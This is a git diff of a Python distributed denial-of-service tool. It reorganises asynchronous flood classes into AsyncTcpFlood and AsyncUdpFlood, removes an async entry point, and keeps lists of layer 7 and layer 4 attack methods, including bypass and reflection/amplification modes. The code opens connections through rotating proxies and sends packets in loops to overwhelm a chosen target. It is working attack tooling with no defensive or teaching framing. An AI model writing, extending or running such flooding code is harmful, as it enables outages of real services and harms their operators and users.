@@ -77,11 +77,11 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "DOWNLOADER",
+        "APACHE", "XMLRPC", "BOT", "DOWNLOADER", "TCP"
     }
 
     LAYER4_METHODS: Set[str] = {
-        "TCP", "UDP", "SYN", "VSE", "MEM", "NTP", "DNS", "ARD",
+        "UDP", "SYN", "VSE", "MEM", "NTP", "DNS", "ARD",
         "CHAR", "RDP", "CPS", "FIVEM", "TS3", "MCPE",
         "CLDAP"
     }
@@ -900,7 +900,7 @@ class HttpFlood:
 
 
 # XXX: there's literally no need for this class to exist
-class AsyncHttpFlood(HttpFlood):
+class AsyncTcpFlood(HttpFlood):
 
     async def run(self) -> int:
         return await self.SENT_FLOOD()
@@ -1034,7 +1034,6 @@ class AsyncHttpFlood(HttpFlood):
         )
         return await self._generic_flood(payload)
 
-    # XXX: with async we have an option to track open connections/requests in flight
     # XXX: timeout for each request
     @scale_attack(factor=3)
     async def BYPASS(self) -> int:
@@ -1173,35 +1172,6 @@ class AsyncHttpFlood(HttpFlood):
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
-
-# XXX: the separation should be based on the socket type: TCP vs. UDP
-#      hence the code duplication for open_connection method
-class AsyncLayer4(Layer4):
-
-    async def run(self) -> int:
-        return await self.SENT_FLOOD()
-
-    # note that TCP_NODELAY is set by default since Python3.6+
-    async def open_connection(
-        self,
-        conn_type=AF_INET,
-        sock_type=SOCK_STREAM,
-        proto_type=IPPROTO_TCP,
-    ) -> socket:
-        adrr, port = self._target
-        is_tls = port == 443
-        if self._proxies:
-            proxy_url: str = self._proxies.pick_random()
-            reader, writer = await aiohttp_socks.open_connection(
-                proxy_url=proxy_url,
-                host=addr,
-                port=port,
-                ssl=ctx if is_tls else None
-            )
-        else:
-            reader, writer = await asyncio.open_connection(host=addr, port=port, ssl=is_tls)
-        return reader, writer
-
     async def TCP(self) -> int:
         packets_sent, packet_size = 0, 1024
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
@@ -1219,6 +1189,12 @@ class AsyncLayer4(Layer4):
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
+
+class AsyncUdpFlood(Layer4):
+
+    async def run(self) -> int:
+        return await self.SENT_FLOOD()
+
     # XXX: have to process "no buffer OSError Errno=55 manually
     async def UDP(self) -> int:
         packets_sent, packet_size = 0, 1024
@@ -1234,48 +1210,13 @@ class AsyncLayer4(Layer4):
         return packets_sent
 
 
-def async_main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
-    if method not in Methods.ALL_METHODS:
-        exit(f"Method {method} Not Found")
-
-    (url, ip), proxies = Tools.parse_params(url, ip, proxies)
-    if method in Methods.LAYER7_METHODS:
-        return AsyncHttpFlood(url, ip, method, rpc, event, USERAGENTS, REFERERS, proxies, stats)
-
-    if method in Methods.LAYER4_METHODS:
-        port = url.port
-
-        if port > 65535 or port < 1:
-            exit("Invalid Port [Min: 1 / Max: 65535] ")
-
-        if not port:
-            logger.warning("Port Not Selected, Set To Default: 80")
-            port = 80
-
-        ref = None
-        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
-            # TODO: rework this code when amplifier attack is planned
-            # (not used as of now)
-            refl_li = ROOT_DIR / "files" / refl_li_fn
-            if not refl_li.exists():
-                exit("The reflector file doesn't exist")
-            with refl_li.open("r+") as f:
-                ref = set(
-                    a.strip()
-                    for a in ProxyTools.Patterns.IP.findall(f.read())
-                )
-            if not ref:
-                exit("Empty Reflector File ")
-
-        return AsyncLayer4((ip, port), ref, method, event, proxies, stats)
-
 def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
     if method not in Methods.ALL_METHODS:
         exit(f"Method {method} Not Found")
 
     (url, ip), proxies = Tools.parse_params(url, ip, proxies)
     if method in Methods.LAYER7_METHODS:
-        return HttpFlood(url, ip, method, rpc, event, USERAGENTS, REFERERS, proxies, stats)
+        return AsyncTcpFlood(url, ip, method, rpc, event, USERAGENTS, REFERERS, proxies, stats)
 
     if method in Methods.LAYER4_METHODS:
         port = url.port
@@ -1302,4 +1243,4 @@ def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
             if not ref:
                 exit("Empty Reflector File ")
 
-        return Layer4((ip, port), ref, method, event, proxies, stats)
+        return AsyncUdpFlood((ip, port), ref, method, event, proxies, stats)
